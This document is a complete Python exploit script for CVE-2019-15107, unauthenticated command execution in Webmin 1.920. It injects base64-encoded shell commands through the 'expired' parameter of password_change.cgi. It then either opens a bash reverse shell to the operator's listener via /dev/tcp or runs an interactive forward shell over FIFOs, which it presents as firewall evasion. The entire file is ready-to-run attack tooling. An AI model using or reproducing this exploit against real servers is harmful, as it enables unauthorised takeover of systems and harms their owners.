import requests
import argparse
import base64
import re
import threading
import time

class Webmin():
    def __init__(self,target,lhost,lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.url = self.url_fix()
        
        if args.fs:
            self.input = "/dev/shm/input"
            self.output = "/dev/shm/output"
            self.makefifo()
             
            self.thread = threading.Thread(target=self.readoutput, args=())
            self.thread.daemon = True
            self.thread.start()

            self.write_cmd()
        else:
            cmd = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
            cmd_encoded = self.base64encode(cmd)
            print("Sending Reverse Shell payload")
            print("user=bababooey&pam=''&expired=2 | echo '';echo " + cmd_encoded + " | base64 -d | sh'")
            self.exploit(cmd_encoded)
        
    def url_fix(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def base64encode(self,string):
        string_bytes = string.encode("ascii")
        base64_bytes = base64.b64encode(string_bytes)
        base64_string = base64_bytes.decode("ascii")

        return base64_string

    def makefifo(self):
        make_fifo = "mkfifo " + self.input + "; tail -f " + self.input + " | /bin/sh 2>&1 > " + self.output
        make_fifo_encoded = self.base64encode(make_fifo)
        self.exploit(make_fifo_encoded)

    def exploit(self,cmd):
        requests.packages.urllib3.disable_warnings()
        pass_change_url = self.url + "password_change.cgi"
        referer_url = self.url + "session_login.cgi"

        exploit_headers = {
            "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1;",
            "Referer": referer_url
        }

        post_data = {
            "user":"bababooey",
            "pam":"",
            "expired":"2 | echo '';echo " + cmd + " | base64 -d | sh" 
        }

        try: 
            req_site = requests.post(pass_change_url,data=post_data,headers=exploit_headers,verify=False,timeout=1)
            search = re.compile(r"chosen.\s+(.*?)</p>",re.DOTALL)
            cmd_text = search.search(req_site.text).group(1)
            return cmd_text.strip()
        except:
            pass
    
    def readoutput(self):
        read_file = "/bin/cat " + self.output
        read_file_encoded = self.base64encode(read_file)
        while True:
            output = self.exploit(read_file_encoded) 
            if output:
                print(output)
                clear_file = "echo -n '' > " + self.output
                clear_file_encoded = self.base64encode(clear_file)
                self.exploit(clear_file_encoded)
            time.sleep(1)

    def write_cmd(self):
        requests.packages.urllib3.disable_warnings()
        print("CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution")
        print("Getting shell on target " + self.url)

        pass_change_url = self.url + "password_change.cgi"
        referer_url = self.url + "session_login.cgi"

        exploit_headers = {
            "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1;",
            "Referer": referer_url
        }

        while True:
            try:
                cmd = input("RCE: ")
                cmd= cmd + "\n"
                cmd_encoded = self.base64encode(cmd)
                post_data = {
                    "user":"bababooey",
                    "pam":"",
                    "expired":"2 | echo '';echo " + cmd_encoded + " | base64 -d > " + self.input 
                }

                requests.post(pass_change_url,data=post_data,headers=exploit_headers,verify=False)
                time.sleep(2.5)

            except KeyboardInterrupt:
                remove_files = "rm " + self.input + ";rm " + self.output
                remove_files_encoded = self.base64encode(remove_files)
                self.exploit(remove_files_encoded)
                print("\nBye Bye!")
                exit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://webmin.site/', required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=False)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=False)
    parser.add_argument('-fs',action='store_true',help='Forward Shell for Firewall Evasion', required=False) 
       
    args = parser.parse_args()
    try:
        Webmin(args.t,args.lhost,args.lport)
    except TypeError:
        print("We need either -lhost or -lport arguments or -fs")